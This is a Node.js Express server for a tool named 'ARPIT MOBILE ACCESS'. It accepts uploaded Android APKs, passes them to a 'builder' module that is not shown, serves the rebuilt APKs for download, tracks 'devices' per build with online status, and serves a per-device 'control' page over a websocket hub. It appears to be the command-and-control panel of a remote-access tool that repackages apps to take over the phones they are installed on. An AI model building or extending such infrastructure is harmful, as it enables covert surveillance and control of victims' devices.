require('dotenv').config();
const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const cookieParser = require('cookie-parser');
const { nanoid } = require('nanoid');

const db = require('./db');
const auth = require('./auth');
const hub = require('./hub');
const builder = require('./builder');
const queue = require('./queue');

const APK_DIR = process.env.APK_DIR || path.join(__dirname, '..', 'apks');
const UP_DIR = process.env.UP_DIR || '/tmp/arpit-up';
const MAX_APK = Number(process.env.MAX_APK_MB || 100) * 1024 * 1024;

fs.mkdirSync(APK_DIR, { recursive: true });
fs.mkdirSync(UP_DIR, { recursive: true });

const app = express();
const server = http.createServer(app);
const up = multer({ dest: UP_DIR, limits: { fileSize: MAX_APK } });
const prod = process.env.NODE_ENV === 'production';
const cookieOpts = { httpOnly: true, sameSite: 'lax', secure: prod };

app.set('trust proxy', 1);
app.use(express.json({ limit: '1mb' }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, '..', 'public')));

app.get('/api/health', (req, res) => {
  let dbOk = true;
  try { db.prepare('SELECT 1').get(); } catch { dbOk = false; }
  res.status(dbOk ? 200 : 500).json({
    ok: dbOk,
    mem: Math.round(process.memoryUsage().rss / 1048576) + 'MB',
    ...queue.stats()
  });
});

/* ---------- auth ---------- */
app.post('/api/register', (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) return res.status(400).json({ error: 'email+password' });
  if (db.prepare('SELECT 1 FROM users WHERE email=?').get(email)) return res.status(409).json({ error: 'exists' });
  const r = db.prepare('INSERT INTO users (email,hash,created) VALUES (?,?,?)')
    .run(email, auth.hash(password), Date.now());
  res.cookie('t', auth.sign(r.lastInsertRowid), cookieOpts);
  res.json({ ok: true });
});

app.post('/api/login', (req, res) => {
  const body = req.body || {};
  const u = db.prepare('SELECT * FROM users WHERE email=?').get(body.email || '');
  if (!u || !auth.verify(body.password || '', u.hash)) return res.status(401).json({ error: 'bad login' });
  res.cookie('t', auth.sign(u.id), cookieOpts);
  res.json({ ok: true });
});

app.post('/api/logout', (req, res) => { res.clearCookie('t'); res.json({ ok: true }); });

/* ---------- builds ---------- */
app.get('/api/builds', auth.guard, (req, res) => {
  const rows = db.prepare(`
    SELECT b.*, (SELECT COUNT(*) FROM devices d WHERE d.build_id=b.id) AS devices,
           (SELECT COUNT(*) FROM devices d WHERE d.build_id=b.id AND d.online=1) AS online
    FROM builds b ORDER BY b.created DESC`).all();
  res.json(rows.map(({ secret, ...r }) => r));
});

app.post('/api/builds', auth.guard, up.single('apk'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'apk required' });
  if (req.file.size > MAX_APK) return res.status(413).json({ error: 'apk too big' });

  const name = ((req.body && req.body.name) || '').trim() || 'build-' + Date.now();
  const id = nanoid(8);
  const inputApk = req.file.path;

  db.prepare('INSERT INTO builds (id,name,orig,status,secret,created) VALUES (?,?,?,?,?,?)')
    .run(id, name, req.file.originalname, 'building', nanoid(24), Date.now());

  const ok = queue.push(() => builder.build({ buildId: id, inputApk, name }));
  if (!ok) {
    db.prepare("UPDATE builds SET status='failed', err=? WHERE id=?").run('queue full, baad me try karo', id);
    fs.rm(inputApk, { force: true }, () => {});
    return res.status(429).json({ error: 'queue full' });
  }

  res.json({ id });
});

app.get('/api/builds/:id', auth.guard, (req, res) => {
  const b = db.prepare('SELECT * FROM builds WHERE id=?').get(req.params.id);
  if (!b) return res.status(404).json({ error: 'nf' });
  res.json(b);
});

app.delete('/api/builds/:id', auth.guard, (req, res) => {
  db.prepare('DELETE FROM builds WHERE id=?').run(req.params.id);
  db.prepare('DELETE FROM devices WHERE build_id=?').run(req.params.id);
  fs.rm(path.join(APK_DIR, `${req.params.id}.apk`), { force: true }, () => {});
  res.json({ ok: true });
});

app.get('/apks/:id.apk', (req, res) => {
  const f = path.join(APK_DIR, `${req.params.id}.apk`);
  if (!fs.existsSync(f)) return res.status(404).end();
  res.download(f, `${req.params.id}.apk`);
});

/* ---------- devices ---------- */
app.get('/api/devices/:buildId', (req, res) => {
  res.json(db.prepare('SELECT * FROM devices WHERE build_id=? ORDER BY online DESC, last DESC').all(req.params.buildId));
});

app.get('/api/device/:id', (req, res) => {
  const d = db.prepare('SELECT * FROM devices WHERE id=?').get(req.params.id);
  if (!d) return res.status(404).json({ error: 'nf' });
  res.json(d);
});

/* ---------- pages ---------- */
app.get('/p/:id', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'panel.html')));
app.get('/p/:id/d/:dev', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'control.html')));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'index.html')));

/* ---------- ws ---------- */
hub.attach(server);

server.listen(process.env.PORT || 3000, '0.0.0.0', () => {
  console.log('ARPIT MOBILE ACCESS up on ' + (process.env.PORT || 3000));
});
